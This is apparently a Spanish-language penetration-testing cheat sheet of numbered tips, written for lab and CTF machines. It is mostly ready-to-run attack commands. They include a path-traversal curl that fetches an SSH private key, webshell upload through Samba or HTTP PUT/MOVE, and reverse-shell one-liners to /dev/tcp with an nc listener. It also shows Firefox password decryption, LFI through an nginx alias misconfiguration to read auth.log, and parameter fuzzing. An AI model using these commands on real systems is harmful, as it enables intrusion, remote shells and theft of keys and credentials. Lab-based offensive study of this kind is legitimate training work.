curl -o id_rsa 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'

-------------------------------------------------------------------------------

## 90.- Multiplexación de servicios.

Se utiliza un puerto para diferentes servicios

por ejemplo se puede utilizar ssh y http en un puerto por ejemplo 21 que corresponde a ftp.

puedo hacer fuzzing web con http://192.168.42.193:21/

para analizar lo que hay en http uso curl

sin http por delante:

curl IP-VICTIMA:21

referencia máquina plex vulnyx 

-------------------------------------------------------------------------------

## 91.- Si tenemos un servidor samba relacionado con un servidor web y tenemos permisos de escritura en el servidor samba

primero debemos ver las cabecera del servidor web, para ver si es linux o windows

curl http://IP-VICTIMA:PORT -I

si en la cabecera encontramos algo como:

X-AspNet-Version: 4.0.30319

se trata de un servidor windows.

entonces subimos una windows:

https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/webshell.aspx

configuramos en :

psi.FileName="bash"
ps.Arguments="-c "+arg;

intrusión

accedemos a la webshell

http://IP-VICTIMA:port/webshell.aspx

nos aparece un input con el label comand

y ejecutamos:

'bash -c "bash -i >& /dev/tcp/IP-KALI/PORT 0>&1"'

o

'sh -i >& /dev/tcp/IP-KALI/PORT 0>&1'

en kali:

nc -lnvp PORT

- Podemos también ver otros archivos como id_rsa si se está ejecutando ssh en el sistema.

'cat .ssh/id_rsa'

'ls -la'

-------------------------------------------------------------------------------

## 92.- Cuando ejecutamos un escaneo con nmap, y tenemos puerto http abiertos, hay que fijarnos que métodos podemos ejecutar.

si es PUT podemos subir una reverse shell o webshell

EJEMPLO

curl -X PUT --upload-file test.txt http://IP-VÍCTIMA:8080


si no me permite suir un revshell.php y me sale un 404 Not Found y está tamién que se puede usar el método MOVE, entonces subimos un revshell con la extensión .txt y con el método MOVE le cambiamos la extensión.

cambiar la extensión

curl -X MOVE -H "Destination: http://IP-VÍCTIMA:8080/shell.php" http://IP-VÍCTIMA:8080/shell.txt

-------------------------------------------------------------------------------

## 93.- La primera línea de un id_rsa es:

-----BEGIN RSA PRIVATE KEY-----

y la última:

-----END RSA PRIVATE KEY-----

## 94.- Cuando al descomprimir  un backup.zip tenemos no sale una carpeta mozila y dentro de ella una carpeta firefox, podemos usar la siguiente herramienta para ver que es lo que hay dentro.

https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py

forma de uso:

nos paramos en la misma carpeta donde se encuentra mozilla

python3 decript.py mozila/firefox

elegimos la opción 2

y nos motrará información como:

Website:   http://localhost
Username: 'marco'
Password: 'm@rc0!123'

-------------------------------------------------------------------------------

## 95.- Si encuentro un archivo de cofiguración de algún servidor web que contenga algo parecido a esto:

server {
	listen 80 default_server;
	listen [::]:80 default_server;

	root /var/www/html;

	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}
	
        location /bak {
                alias /var/backups/;
        }
}

ver la parte de location /bak 

indica que las solicitudes a /bak accederán al directorio /var/backups/ del servidor.

el error de configuración está en que en la parte de location debe ir como /bak/ y no como /bak, le falta el slash al final

podemos hacer LFI como /bak../otros/directorios/archivos

realizo fuerza bruta de directorios en esa ruta

wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/big.txt 192.168.42.200/bak../FUZZ

supongamos que me dió un resultado como:

000003048:   301        7 L      11 W       169 Ch      "backups"                                                                                             
000003933:   301        7 L      11 W       169 Ch      "cache"                                                                                               
000010777:   301        7 L      11 W       169 Ch      "lib"                                                                                                 
000011026:   301        7 L      11 W       169 Ch      "lock"                                                                                                
000011035:   301        7 L      11 W       169 Ch      "log"                                                                                                 
000011004:   301        7 L      11 W       169 Ch      "local"                                                                                               
000011235:   301        7 L      11 W       169 Ch      "mail"                                                                                                
000013120:   301        7 L      11 W       169 Ch      "opt"                                                                                                 
000015701:   301        7 L      11 W       169 Ch      "run"                                                                                                 
000017016:   301        7 L      11 W       169 Ch      "spool"                                                                                               
000018179:   301        7 L      11 W       169 Ch      "tmp"                                                                                                 
000020075:   301        7 L      11 W       169 Ch      "www"

un archivo importante sería log

lo enumeramos

wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,log 192.168.42.200/bak../log/FUZZ.FUZ2Z

resultado:

000000749:   200        6 L      73 W       560 Ch      "auth - log"

para ver los logs:

curl -S http://192.168.42.200/bak../log/auth.log

-------------------------------------------------------------------------------

## 96.- Si al hacer fuzzing web no encontramos nada, entonces hacemos fuzzing por parámetros

wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.42.200:8080/?FUZZ'

y según lo encontremos podemos aplicar XSS, SSTI o hasta LFI


